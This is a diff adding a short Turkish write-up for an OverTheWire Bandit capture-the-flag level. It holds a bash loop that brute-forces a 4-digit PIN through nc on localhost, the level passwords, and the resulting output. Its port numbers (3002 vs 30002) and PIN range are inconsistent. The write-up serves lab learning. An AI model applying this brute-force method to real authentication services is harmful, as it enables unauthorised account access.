@@ -1,0 +1,39 @@
+[ İstenilen ]
+
+Bir deamon 3002 numaralı portu dinliyor ve eğer bandit24 parolası verilirse
+bandit25 için 4 basamaklı pincode bulunacak. Brute-force saldırı yöntemi ile
+ancak 4 haneli pincode bulunabileceği unutmayın.
+
+[ Çözüm ]
+
+Step0	: nc 127.0.0.1 3002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Fail! You did not supply enough data. Try again.
+Exiting.
+
+Step1	: cd /tmp
+
+Step2	: vim solution.sh
+pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for i in {1000..10000}
+do {
+if
+    echo $pass $i| nc localhost 30002 | grep Wrong > /dev/null
+then
+    echo $i
+else
+    echo $pass $i| nc localhost 30002
+    exit
+fi
+}
+done
+
+Step3	: chmod +x solution.sh
+
+Step4	: ./solution.sh
+(Bütün kombinasyonları denicek veee..)
+I am the pincode checker for user bandit25. Please enter the password for user 
+bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
